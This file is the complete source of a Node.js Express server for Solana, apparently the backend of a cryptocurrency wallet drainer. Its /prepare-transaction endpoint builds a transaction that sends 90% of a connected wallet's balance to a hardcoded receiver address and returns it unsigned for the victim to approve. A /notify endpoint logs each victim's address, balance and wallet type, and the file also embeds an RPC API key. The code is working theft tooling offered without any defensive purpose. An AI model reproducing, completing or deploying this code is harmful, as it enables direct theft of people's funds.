const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// ============================================
// CONFIGURATION
// ============================================
const HELIUS_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
const connection = new Connection(HELIUS_RPC, 'confirmed');

console.log('✅ Server starting...');
console.log(`🎯 Receiver wallet: ${RECEIVER_WALLET}`);

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

// ============================================
// TEST ENDPOINT
// ============================================
app.get('/test', async (req, res) => {
    try {
        const testPubkey = new PublicKey('5V2jK6QZqQoD99FrSrBBmdgzdfZWPufzViiDNS8skqiQ');
        const balance = await connection.getBalance(testPubkey);
        res.json({ 
            success: true, 
            message: 'Server is working!',
            balance: balance / 1e9,
            receiver: RECEIVER_WALLET.slice(0, 8) + '...'
        });
    } catch (err) {
        res.json({ success: false, error: err.message });
    }
});

// ============================================
// GET BALANCE
// ============================================
app.post('/api/getBalance', async (req, res) => {
    try {
        const { publicKey } = req.body;
        if (!publicKey) return res.status(400).json({ error: 'publicKey required' });
        
        const pubkey = new PublicKey(publicKey);
        const balance = await connection.getBalance(pubkey);
        
        console.log(`💰 Balance for ${publicKey.slice(0, 8)}...: ${(balance / 1e9).toFixed(4)} SOL`);
        res.json({ success: true, balance });
    } catch (err) {
        console.error('❌ GetBalance error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// GET BLOCKHASH
// ============================================
app.post('/api/getBlockhash', async (req, res) => {
    try {
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        res.json({ success: true, blockhash, lastValidBlockHeight });
    } catch (err) {
        console.error('❌ GetBlockhash error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// SEND TRANSACTION
// ============================================
app.post('/api/sendTransaction', async (req, res) => {
    try {
        const { transaction } = req.body;
        if (!transaction) return res.status(400).json({ error: 'transaction required' });
        
        const txBuffer = Buffer.from(transaction, 'base64');
        const signature = await connection.sendRawTransaction(txBuffer);
        console.log(`📤 Transaction sent: ${signature}`);
        
        res.json({ success: true, txid: signature });
    } catch (err) {
        console.error('❌ SendTransaction error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ============================================
// PREPARE TRANSACTION - FIXED VERSION
// ============================================
app.post('/prepare-transaction', async (req, res) => {
    console.log('\n📝 /prepare-transaction called');
    
    try {
        const { publicKey } = req.body;
        
        if (!publicKey) {
            return res.status(400).json({ success: false, error: 'publicKey required' });
        }
        
        console.log(`👛 Wallet: ${publicKey.slice(0, 8)}...`);
        
        const fromPubkey = new PublicKey(publicKey);
        const toPubkey = new PublicKey(RECEIVER_WALLET);
        
        const balance = await connection.getBalance(fromPubkey);
        console.log(`💰 Balance: ${(balance / 1e9).toFixed(4)} SOL`);
        
        if (balance < 20000000) {
            return res.json({ 
                success: false, 
                error: `Insufficient balance. Have: ${(balance / 1e9).toFixed(4)} SOL, Need: 0.02 SOL` 
            });
        }
        
        const amountToSend = Math.floor(balance * 0.9);
        console.log(`📤 Amount to send: ${(amountToSend / 1e9).toFixed(6)} SOL`);
        
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        const serialized = transaction.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });
        
        console.log(`✅ Transaction prepared, size: ${serialized.length} bytes`);
        
        res.json({
            success: true,
            transaction: Array.from(serialized),
            amount: amountToSend,
            amountSol: (amountToSend / 1e9).toFixed(6)
        });
        
    } catch (err) {
        console.error('❌ Prepare error:', err.message);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============================================
// NOTIFICATION
// ============================================
app.post('/notify', (req, res) => {
    const { address, balance, walletType, customMessage } = req.body;
    console.log('\n📱 NOTIFICATION:', customMessage);
    console.log(`   Address: ${address ? address.slice(0, 8) + '...' : 'unknown'}`);
    console.log(`   Balance: ${balance} SOL`);
    res.json({ ok: true });
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`🎯 Receiver: ${RECEIVER_WALLET.slice(0, 8)}...${RECEIVER_WALLET.slice(-8)}`);
    console.log(`🌐 Test: /test\n`);
});
